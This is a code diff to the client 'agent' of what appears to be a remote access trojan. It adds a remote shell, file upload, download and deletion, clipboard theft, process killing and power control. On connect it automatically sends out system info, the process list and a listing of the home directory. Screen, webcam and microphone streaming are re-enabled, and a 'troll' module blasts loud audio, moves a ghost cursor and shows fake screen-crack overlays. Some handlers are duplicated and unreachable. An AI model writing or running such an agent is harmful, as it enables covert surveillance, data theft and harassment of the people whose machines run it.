@@ -7,6 +7,12 @@ import json
 import subprocess
 import urllib.request
 import platform
+import base64
+
+# FIX: Windows specific event loop policy to prevent "Task was destroyed but it is pending" errors
+# and improve stability with subprocesses/pipes.
+if sys.platform == 'win32':
+    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
 
 # Add parent directory to path for source execution
 if not getattr(sys, 'frozen', False):
@@ -31,6 +37,12 @@ try:
     from target.audio import AudioStreamer
     from target.input_controller import (InputController, parse_mouse_move, 
                                           parse_mouse_click, parse_key_press, parse_scroll)
+    from target.shell_handler import ShellHandler
+    from target.process_manager import ProcessManager
+    from target.file_manager import FileManager
+    from target.clipboard_handler import ClipboardHandler
+    from target.device_settings import DeviceSettings
+    from target.troll_handler import TrollHandler
 except ImportError:
     # Fallback for frozen application or direct execution
     
@@ -41,6 +53,12 @@ except ImportError:
     from audio import AudioStreamer
     from input_controller import (InputController, parse_mouse_move, 
                                    parse_mouse_click, parse_key_press, parse_scroll)
+    from shell_handler import ShellHandler
+    from process_manager import ProcessManager
+    from file_manager import FileManager
+    from clipboard_handler import ClipboardHandler
+    from device_settings import DeviceSettings
+    from troll_handler import TrollHandler
 
 # CONFIG
 HARDCODED_BROKER = None
@@ -85,7 +103,63 @@ class AsyncAgent:
         self.mic = AudioStreamer()
         self.input_ctrl = InputController()
         # Privacy component
+        
+        # FIX: Store background tasks to prevent garbage collection (Task destroyed error)
+        self.background_tasks = set()
         self.privacy = PrivacyCurtain() # Retain original curtain init
+        
+        # New Handlers
+        self.shell_handler = ShellHandler(
+            on_output=self.on_shell_output,
+            on_exit=self.on_shell_exit
+        )
+        self.process_mgr = ProcessManager()
+        self.file_mgr = FileManager()
+        self.clipboard_handler = ClipboardHandler()
+        self.device_settings = DeviceSettings()
+        self.troll_handler = TrollHandler()
+        self.direct_ws_clients = set()
+        self.direct_url = None
+        self.curtain = self.privacy # Alias for compatibility
+        
+    def _create_background_task(self, coro):
+        """Helper to create fire-and-forget background tasks safely."""
+        task = asyncio.create_task(coro)
+        self.background_tasks.add(task)
+        task.add_done_callback(self.background_tasks.discard)
+        return task        
+        
+    def _send_async(self, opcode, payload=b''):
+        """Helper to safely send message from any thread to ALL clients"""
+        msg = bytes([opcode]) + payload
+        
+        # Send to Broker
+        if self.ws and self.loop:
+            try:
+                asyncio.run_coroutine_threadsafe(
+                    send_msg(self.ws, msg),
+                    self.loop
+                )
+            except Exception:
+                pass
+
+        # Send to Direct Clients
+        if self.direct_ws_clients and self.loop:
+            for client in list(self.direct_ws_clients):
+                try:
+                    asyncio.run_coroutine_threadsafe(
+                        send_msg(client, msg),
+                        self.loop
+                    )
+                except Exception:
+                    pass
+
+    def on_shell_output(self, text):
+        self._send_async(protocol.OP_SHELL_OUTPUT, text.encode('utf-8', errors='replace'))
+        
+    def on_shell_exit(self, code):
+        import struct
+        self._send_async(protocol.OP_SHELL_EXIT, struct.pack('<i', code))
         
         # State
         self.streaming = False
@@ -156,19 +230,27 @@ class AsyncAgent:
 
     async def handle_direct_client(self, websocket):
         """Handle incoming connection from Tunnel"""
-        print(f"[+] Direct Client Connected!")
-        self.direct_ws_clients.add(websocket)
+        # Suppress "InvalidMessage" handshake errors from health checks
         try:
-            async for message in websocket:
-                await self.handle_message(message, websocket)
-        except websockets.exceptions.ConnectionClosed:
-            pass
-        finally:
-            print("[-] Direct Client Disconnected")
+            print("[+] Direct Client Connected!")
+            self.direct_ws_clients.add(websocket)
+            try:
+                async for message in websocket:
+                    await self.handle_message(message, websocket)
+            except websockets.exceptions.ConnectionClosed:
+                pass
+            finally:
+                print("[-] Direct Client Disconnected")
+                self.direct_ws_clients.discard(websocket)
+        except websockets.exceptions.InvalidMessage:
+            # Common with Cloudflare Tunnel health checks
+            self.direct_ws_clients.discard(websocket)
+            return
+        except Exception as e:
+            print(f"[-] Direct Handler Error: {e}")
             self.direct_ws_clients.discard(websocket)
 
     async def handle_message(self, message, source_ws):
-        """Unified message handler for both Broker and Direct connections"""
         """Unified message handler for both Broker and Direct connections"""
         try:
             if isinstance(message, bytes):
@@ -177,38 +259,52 @@ class AsyncAgent:
                 opcode = message[0]
                 payload = message[1:]
                 
+        # === REMOTE INPUT ===
                 if opcode == protocol.OP_MOUSE_MOVE:
-                    x, y = parse_mouse_move(payload)
-                    if x is not None and self.input_ctrl:
-                        await self.loop.run_in_executor(None, self.input_ctrl.move_mouse, x, y)
+                    try:
+                        x, y = parse_mouse_move(payload)
+                        if x is not None:
+                            await self.loop.run_in_executor(None, self.input_ctrl.move_mouse, x, y)
+                    except Exception as e:
+                        print(f"[-] Mouse Move Error: {e}")
                 
                 elif opcode == protocol.OP_MOUSE_CLICK:
-                    button, pressed = parse_mouse_click(payload)
-                    if button is not None and self.input_ctrl:
-                        await self.loop.run_in_executor(None, self.input_ctrl.click_mouse, button, pressed)
+                    try:
+                        button, pressed = parse_mouse_click(payload)
+                        if button is not None:
+                            await self.loop.run_in_executor(None, self.input_ctrl.click_mouse, button, pressed)
+                    except Exception as e:
+                        print(f"[-] Mouse Click Error: {e}")
                 
                 elif opcode == protocol.OP_KEY_PRESS:
-                    key_code, pressed = parse_key_press(payload)
-                    if key_code is not None and self.input_ctrl:
-                        await self.loop.run_in_executor(None, self.input_ctrl.press_key, key_code, pressed)
+                    try:
+                        key_code, pressed = parse_key_press(payload)
+                        if key_code is not None:
+                            await self.loop.run_in_executor(None, self.input_ctrl.press_key, key_code, pressed)
+                    except Exception as e:
+                        print(f"[-] Key Press Error: {e}")
                 
                 elif opcode == protocol.OP_SCROLL:
-                    dx, dy = parse_scroll(payload)
-                    if self.input_ctrl:
-                        await self.loop.run_in_executor(None, self.input_ctrl.scroll, dx, dy)
-
+                    try:
+                        dx, dy = parse_scroll(payload)
+                        if dx is not None:
+                            await self.loop.run_in_executor(None, self.input_ctrl.scroll, dx, dy)
+                    except Exception as e:
+                        print(f"[-] Scroll Error: {e}")
+                
                 elif opcode == protocol.OP_KEY_BUFFER:
+                    # Buffered text input
                     try:
                         text = payload.decode('utf-8')
-                        if self.input_ctrl:
-                            await self.loop.run_in_executor(None, self.input_ctrl.type_text, text)
-                    except Exception: pass
+                        await self.loop.run_in_executor(None, self.input_ctrl.type_text, text)
+                    except Exception as e:
+                        print(f"[-] Buffer Input Error: {e}")
 
                 elif opcode == protocol.OP_CAM_START:
                     if not self.cam_streaming:
                         if self.webcam.start():
                             self.cam_streaming = True
-                            asyncio.create_task(self.stream_webcam(source_ws))
+                            self._create_background_task(self.stream_webcam(source_ws))
                         else:
                             # Send error back to viewer
                             print("[!] Webcam failed, notifying viewer...")
@@ -221,7 +317,7 @@ class AsyncAgent:
                 elif opcode == protocol.OP_MIC_START:
                     if self.mic.start():
                         self.mic_streaming = True
-                        asyncio.create_task(self.stream_mic(source_ws))
+                        self._create_background_task(self.stream_mic(source_ws))
                     else:
                         # Send error back to viewer
                         print("[!] Mic failed, notifying viewer...")
@@ -285,10 +381,312 @@ class AsyncAgent:
                             self.apply_settings(settings)
                         except: pass
                 
+                # ================================================================
+                # Troll
+                # ================================================================
+                elif opcode == protocol.OP_TROLL_URL:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        url = data.get('url', '')
+                        await self.loop.run_in_executor(None, self.troll_handler.open_url, url)
+                    except Exception as e:
+                        print(f"[-] Troll URL Error: {e}")
+                
+                elif opcode == protocol.OP_TROLL_SOUND:
+                    await self.loop.run_in_executor(None, self.troll_handler.play_sound, payload)
+                
+                elif opcode == protocol.OP_TROLL_RANDOM_SOUND:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        if data.get('enabled'):
+                            interval = data.get('interval_ms', 5000)
+                            self.troll_handler.start_random_sounds(interval)
+                        else:
+                            self.troll_handler.stop_random_sounds()
+                    except Exception as e:
+                        print(f"[-] Troll Random Sound Error: {e}")
+                
+                elif opcode == protocol.OP_TROLL_ALERT_LOOP:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        if data.get('enabled'):
+                            self.troll_handler.start_alert_loop()
+                        else:
+                            self.troll_handler.stop_alert_loop()
+                    except Exception as e:
+                        print(f"[-] Troll Alert Loop Error: {e}")
+                
+                elif opcode == protocol.OP_TROLL_VOLUME_MAX:
+                    await self.loop.run_in_executor(None, self.troll_handler.volume_max_sound)
+                
+                elif opcode == protocol.OP_TROLL_EARRAPE:
+                    await self.loop.run_in_executor(None, self.troll_handler.earrape)
+                
+                elif opcode == protocol.OP_TROLL_WHISPER:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        if data.get('enabled'):
+                            self.troll_handler.start_whisper()
+                        else:
+                            self.troll_handler.stop_whisper()
+                    except Exception as e:
+                        print(f"[-] Troll Whisper Error: {e}")
+                
+                elif opcode == protocol.OP_TROLL_VIDEO:
+                    await self.loop.run_in_executor(None, self.troll_handler.play_video, payload)
+                
+                elif opcode == protocol.OP_TROLL_GHOST_CURSOR:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        if data.get('enabled'):
+                            self.troll_handler.start_ghost_cursor()
+                        else:
+                            self.troll_handler.stop_ghost_cursor()
+                    except Exception as e:
+                        print(f"[-] Troll Ghost Cursor Error: {e}")
+                
+                elif opcode == protocol.OP_TROLL_SHUFFLE_ICONS:
+                    await self.loop.run_in_executor(None, self.troll_handler.shuffle_desktop_icons)
+                
+                elif opcode == protocol.OP_TROLL_WALLPAPER:
+                    await self.loop.run_in_executor(None, self.troll_handler.set_wallpaper, payload)
+                
+                elif opcode == protocol.OP_TROLL_OVERLAY:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        overlay_type = data.get('type', 'crack')
+                        await self.loop.run_in_executor(None, self.troll_handler.show_overlay, overlay_type)
+                    except Exception as e:
+                        print(f"[-] Troll Overlay Error: {e}")
+                
+                elif opcode == protocol.OP_TROLL_STOP:
+                    await self.loop.run_in_executor(None, self.troll_handler.stop_all)
+                
+                # ============================================================================
+                # NEW HANDLERS
+                # ============================================================================
+
+                # SHELL
+                elif opcode == protocol.OP_SHELL_EXEC:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        cmd = data.get('cmd')
+                        shell_type = data.get('shell', 'ps')
+                        
+                        # Start shell if not running or type changed
+                        if (not self.shell_handler.running or 
+                            self.shell_handler.current_shell != shell_type):
+                            # Run in executor to avoid blocking main loop
+                            await self.loop.run_in_executor(None, self.shell_handler.start_shell, shell_type)
+                            
+                        # Write input (enter is handled by handler or client)
+                        if cmd:
+                            await self.loop.run_in_executor(None, self.shell_handler.write_input, cmd)
+                            
+                        # FEATURE: Broadcast CWD update
+                        await asyncio.sleep(0.5) # Give it a moment to change dir
+                        cwd = await self.loop.run_in_executor(None, self.shell_handler.get_cwd)
+                        if cwd:
+                            self._send_async(protocol.OP_SHELL_CWD, cwd.encode('utf-8'))
+                    except Exception as e:
+                        print(f"[-] Shell Exec Error: {e}")
+
+                # PROCESS MANAGER
+                elif opcode == protocol.OP_PM_LIST:
+                    try:
+                        procs = await self.loop.run_in_executor(None, self.process_mgr.list_processes)
+                        data = self.process_mgr.to_json(procs)
+                        self._send_async(protocol.OP_PM_DATA, data)
+                    except Exception as e:
+                        print(f"[-] PM List Error: {e}")
+                
+                elif opcode == protocol.OP_PM_KILL:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        pid = data.get('pid')
+                        if pid:
+                            await self.loop.run_in_executor(None, self.process_mgr.kill_process, pid)
+                            # Refresh list after kill
+                            procs = await self.loop.run_in_executor(None, self.process_mgr.list_processes)
+                            data = self.process_mgr.to_json(procs)
+                            self._send_async(protocol.OP_PM_DATA, data)
+                    except Exception as e:
+                        print(f"[-] PM Kill Error: {e}")
+
+                # FILE MANAGER
+                elif opcode == protocol.OP_FM_LIST:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        path = data.get('path', '')
+                        # Fix: list_files -> list_dir
+                        files = await self.loop.run_in_executor(None, self.file_mgr.list_dir, path)
+                        
+                        # Fix: Construct correct response structure since list_dir only returns list
+                        current_path = path if path else os.path.expanduser("~")
+                        resp = json.dumps({'files': files, 'path': current_path}).encode('utf-8')
+                        self._send_async(protocol.OP_FM_DATA, resp)
+                    except Exception as e:
+                        print(f"[-] FM List Error: {e}")
+
+                elif opcode == protocol.OP_FM_DOWNLOAD:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        path = data.get('path')
+                        if path:
+                            # Stream chunks
+                            for chunk in self.file_mgr.read_file_chunks(path):
+                                self._send_async(protocol.OP_FM_CHUNK, chunk)
+                                await asyncio.sleep(0.001) # Yield to event loop
+                    except Exception as e:
+                        print(f"[-] FM Download Error: {e}")
+
+                elif opcode == protocol.OP_FM_UPLOAD:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        path = data.get('path')
+                        b64_data = data.get('data')
+                        if path and b64_data:
+                            file_data = base64.b64decode(b64_data)
+                            await self.loop.run_in_executor(None, self.file_mgr.write_file, path, file_data)
+                            # Refresh list
+                            parent = os.path.dirname(path)
+                            # Fix: list_files -> list_dir and manual response construction
+                            files = await self.loop.run_in_executor(None, self.file_mgr.list_dir, parent)
+                            resp = json.dumps({'files': files, 'path': parent}).encode('utf-8')
+                            self._send_async(protocol.OP_FM_DATA, resp)
+                    except Exception as e:
+                        print(f"[-] FM Upload Error: {e}")
+
+                elif opcode == protocol.OP_FM_DELETE:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        path = data.get('path')
+                        if path:
+                            # Fix: delete_item -> delete
+                            await self.loop.run_in_executor(None, self.file_mgr.delete, path)
+                            # Refresh
+                            parent = os.path.dirname(path)
+                            # Fix: list_files -> list_dir
+                            files = await self.loop.run_in_executor(None, self.file_mgr.list_dir, parent)
+                            resp = json.dumps({'files': files, 'path': parent}).encode('utf-8')
+                            self._send_async(protocol.OP_FM_DATA, resp)
+                    except Exception as e:
+                        print(f"[-] FM Delete Error: {e}")
+
+                elif opcode == protocol.OP_FM_MKDIR:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        path = data.get('path')
+                        if path:
+                            # Fix: create_directory -> mkdir
+                            await self.loop.run_in_executor(None, self.file_mgr.mkdir, path)
+                            # Refresh
+                            parent = os.path.dirname(path.rstrip('/\\'))
+                            files = await self.loop.run_in_executor(None, self.file_mgr.list_dir,  parent)
+                            resp = json.dumps({'files': files, 'path': parent}).encode('utf-8')
+                            self._send_async(protocol.OP_FM_DATA, resp)
+                    except Exception as e:
+                        print(f"[-] FM Mkdir Error: {e}")
+
+                # CLIPBOARD
+                elif opcode == protocol.OP_CLIP_GET:
+                    # Fix: get_text -> get_clipboard
+                    text = await self.loop.run_in_executor(None, self.clipboard_handler.get_clipboard)
+                    self._send_async(protocol.OP_CLIP_DATA, text.encode('utf-8'))
+
+                elif opcode == protocol.OP_CLIP_SET:
+                    try:
+                        text = payload.decode('utf-8')
+                        # Fix: set_text -> set_clipboard
+                        await self.loop.run_in_executor(None, self.clipboard_handler.set_clipboard, text)
+                    except Exception as e:
+                        print(f"[-] Clip Set Error: {e}")
+
+                # DEVICE SETTINGS (Volume, etc)
+                # Network settings (WiFi/Ethernet) removed by user request
+                
+                elif opcode == protocol.OP_SET_VOLUME:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        self.device_settings.set_volume(data['level'])
+                    except Exception as e:
+                        print(f"[-] Set Volume Error: {e}")
+
+                elif opcode == protocol.OP_SET_MUTE:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        self.device_settings.set_mute(data['muted'])
+                    except Exception as e:
+                        print(f"[-] Set Mute Error: {e}")
+
+                elif opcode == protocol.OP_SET_BRIGHTNESS:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        self.device_settings.set_brightness(data['level'])
+                    except Exception as e:
+                        print(f"[-] Set Brightness Error: {e}")
+
+                elif opcode == protocol.OP_SET_TIME:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        self.device_settings.set_time(data['datetime'])
+                    except Exception as e:
+                        print(f"[-] Set Time Error: {e}")
+
+                elif opcode == protocol.OP_SYNC_TIME:
+                    try:
+                        await self.loop.run_in_executor(None, self.device_settings.sync_time)
+                    except Exception as e:
+                        print(f"[-] Sync Time Error: {e}")
+
+                elif opcode == protocol.OP_POWER_ACTION:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        await self.loop.run_in_executor(None, self.device_settings.power_action, data['action'])
+                    except Exception as e:
+                        print(f"[-] Power Action Error: {e}")
+
+                elif opcode == protocol.OP_GET_SYSINFO:
+                    try:
+                        info = await self.loop.run_in_executor(None, self.device_settings.get_sysinfo)
+                        self._send_async(protocol.OP_SYSINFO_DATA, json.dumps(info).encode('utf-8'))
+                    except Exception as e:
+                        print(f"[-] SysInfo Error: {e}")
+
+
+                elif opcode == protocol.OP_TROLL_VIDEO:
+                    self.troll_handler.play_video(payload)
+                elif opcode == protocol.OP_TROLL_RANDOM_SOUND:
+                    data = json.loads(payload.decode('utf-8'))
+                    self.troll_handler.set_random_sound(data['enabled'], data.get('interval_ms', 5000))
+                elif opcode == protocol.OP_TROLL_ALERT_LOOP:
+                    data = json.loads(payload.decode('utf-8'))
+                    self.troll_handler.set_alert_loop(data['enabled'])
+                elif opcode == protocol.OP_TROLL_VOLUME_MAX:
+                    self.troll_handler.max_volume_sound()
+                elif opcode == protocol.OP_TROLL_EARRAPE:
+                    self.troll_handler.earrape()
+                elif opcode == protocol.OP_TROLL_WHISPER:
+                    data = json.loads(payload.decode('utf-8'))
+                    self.troll_handler.set_whisper(data['enabled'])
+                elif opcode == protocol.OP_TROLL_GHOST_CURSOR:
+                    data = json.loads(payload.decode('utf-8'))
+                    self.troll_handler.set_ghost_cursor(data['enabled'])
+                elif opcode == protocol.OP_TROLL_SHUFFLE_ICONS:
+                    self.troll_handler.shuffle_icons()
+                elif opcode == protocol.OP_TROLL_WALLPAPER:
+                    self.troll_handler.set_wallpaper(payload)
+                elif opcode == protocol.OP_TROLL_OVERLAY:
+                    data = json.loads(payload.decode('utf-8'))
+                    self.troll_handler.show_overlay(data['type'])
+                elif opcode == protocol.OP_TROLL_STOP:
+                    self.troll_handler.stop_all()
+
                 elif opcode == protocol.OP_DISCONNECT:
                     self.streaming = False
                     self.cam_streaming = False
                     self.mic_streaming = False
+                    self.shell_handler.stop()
                 
                 return 
         except Exception as e:
@@ -370,6 +768,30 @@ class AsyncAgent:
                         payload += f"|{self.direct_url}"
                     
                     await send_msg(ws, bytes([protocol.OP_HELLO]) + payload.encode())
+
+                    # ================================================================
+                    # INITIAL DATA PUSH (Refresh on Connect)
+                    # ================================================================
+                    try:
+                        # 1. SysInfo
+                        info = self.device_settings.get_sysinfo()
+                        self._send_async(protocol.OP_SYSINFO_DATA, json.dumps(info).encode('utf-8'))
+
+                        # 2. Process List
+                        procs = await self.loop.run_in_executor(None, self.process_mgr.list_processes)
+                        pm_data = self.process_mgr.to_json(procs)
+                        self._send_async(protocol.OP_PM_DATA, pm_data)
+
+                        # 3. File List (Home/Root)
+                        home = os.path.expanduser("~")
+                        files = await self.loop.run_in_executor(None, self.file_mgr.list_dir, home)
+                        fm_resp = json.dumps({'files': files, 'path': home}).encode('utf-8')
+                        self._send_async(protocol.OP_FM_DATA, fm_resp)
+                        
+                        print("[+] Initial Data Pushed")
+                    except Exception as e:
+                        print(f"[-] Initial Push Partial Error: {e}")
+
                     await self.handle_messages()
                     
             except Exception as e:
@@ -378,6 +800,7 @@ class AsyncAgent:
                 self.streaming = False
                 self.cam_streaming = False
                 self.mic_streaming = False
+                self.shell_handler.stop()
                 try:
                     await self.loop.run_in_executor(None, self.auditor.stop)
                 except:
@@ -386,106 +809,38 @@ class AsyncAgent:
                 print("[*] Reconnecting in 3 seconds...")
                 await asyncio.sleep(3)  # Faster retry
 
+
+                await asyncio.sleep(3)  # Faster retry
+
+    async def _cwd_poll_loop(self):
+        """Periodically poll CWD from shell handler and start sending updates"""
+        while self.ws:
+            try:
+                if self.shell_handler.running:
+                    cwd = self.shell_handler.get_cwd()
+                    if cwd:
+                        self._send_async(protocol.OP_SHELL_CWD, cwd.encode('utf-8', errors='replace'))
+            except Exception:
+                pass
+            await asyncio.sleep(2.0)
+
     async def handle_messages(self):
+        """Broker Message Loop"""
+        # Start CWD Poller
+        self._create_background_task(self._cwd_poll_loop())
+        
         while True:
             msg = await recv_msg(self.ws)
             if not msg:
                 break
-            
-            opcode = msg[0]
-            payload = msg[1:]
-            
-            if opcode == protocol.OP_CONNECT:
-                if not self.streaming:
-                    print("[!] Viewer requested stream. Starting...")
-                    self.streaming = True
-                    self._stream_task = asyncio.create_task(self.stream_screen())
-                    self.auditor.start()
-            
-            elif opcode == protocol.OP_CAM_START:
-                print("[!] Webcam Start Requested")
-                if not self.cam_streaming and self.webcam.start():
-                    self.cam_streaming = True
-                    asyncio.create_task(self.stream_webcam())
-            
-            elif opcode == protocol.OP_CAM_STOP:
-                print("[!] Webcam Stop Requested")
-                self.cam_streaming = False
-                self.webcam.stop()
-
-            elif opcode == protocol.OP_MIC_START:
-                print("[!] Mic Start Requested")
-                if self.mic.start():
-                    self.mic_streaming = True
-                    asyncio.create_task(self.stream_mic())
-
-            elif opcode == protocol.OP_MIC_STOP:
-                print("[!] Mic Stop Requested")
-                self.mic_streaming = False
-                self.mic.stop()
-            
-            # === REMOTE INPUT ===
-            elif opcode == protocol.OP_MOUSE_MOVE:
-                x, y = parse_mouse_move(payload)
-                if x is not None:
-                    await self.loop.run_in_executor(None, self.input.move_mouse, x, y)
-            
-            elif opcode == protocol.OP_MOUSE_CLICK:
-                button, pressed = parse_mouse_click(payload)
-                if button is not None:
-                    await self.loop.run_in_executor(None, self.input.click_mouse, button, pressed)
-            
-            elif opcode == protocol.OP_KEY_PRESS:
-                key_code, pressed = parse_key_press(payload)
-                if key_code is not None:
-                    await self.loop.run_in_executor(None, self.input.press_key, key_code, pressed)
-            
-            elif opcode == protocol.OP_SCROLL:
-                dx, dy = parse_scroll(payload)
-                await self.loop.run_in_executor(None, self.input.scroll, dx, dy)
-            
-            elif opcode == protocol.OP_KEY_BUFFER:
-                # Buffered text input
-                try:
-                    text = payload.decode('utf-8')
-                    await self.loop.run_in_executor(None, self.input.type_text, text)
-                except Exception as e:
-                    print(f"[-] Buffer Input Error: {e}")
-            
-            elif opcode == protocol.OP_SETTINGS:
-                # Remote settings change (msgpack or JSON)
-                try:
-                    try:
-                        import msgpack
-                        settings = msgpack.unpackb(payload)
-                    except Exception:
-                        settings = json.loads(payload.decode('utf-8'))
-                    self.apply_settings(settings)
-                except Exception as e:
-                    print(f"[-] Settings Error: {e}")
-            
-            elif opcode == protocol.OP_CURTAIN_ON:
-                print("[*] Enabling Privacy Curtain")
-                await self.loop.run_in_executor(None, self.curtain.enable)
-                
-            elif opcode == protocol.OP_CURTAIN_OFF:
-                print("[*] Disabling Privacy Curtain")
-                await self.loop.run_in_executor(None, self.curtain.disable)
-
-            elif opcode == protocol.OP_DISCONNECT:
-                print("[!] Peer Disconnected. Stopping Streams.")
-                self.streaming = False
-                self.cam_streaming = False
-                self.mic_streaming = False
-                self.auditor.stop()
-                self.webcam.stop()
-                self.mic.stop()
+            await self.handle_message(msg, self.ws)
                 
         # CLEANUP ON DISCONNECT
         print("[!] Connection Lost/Reset. Cleaning up...")
         self.streaming = False
         self.cam_streaming = False
         self.mic_streaming = False
+        self.shell_handler.stop()
         self.auditor.stop()
         self.webcam.stop()
         self.mic.stop()
@@ -510,11 +865,11 @@ class AsyncAgent:
                     continue
                 
                 start_time = asyncio.get_running_loop().time()
-                # jpeg = await self.loop.run_in_executor(None, self.capturer.get_frame_bytes)
-                jpeg = None # DISABLED FOR LOCAL TESTING (NO MIRROR)
+                jpeg = await self.loop.run_in_executor(None, self.capturer.get_frame_bytes)
+                # jpeg = None # DISABLED FOR LOCAL TESTING (NO MIRROR)
                 if jpeg:
                     header = bytes([protocol.OP_IMG_FRAME])
-                    pending_send = asyncio.create_task(send_msg(ws_to_use, header + jpeg))
+                    pending_send = self._create_background_task(send_msg(ws_to_use, header + jpeg))
                 
                 elapsed = asyncio.get_running_loop().time() - start_time
                 wait_time = max(0.001, 0.033 - elapsed) # 30 FPS
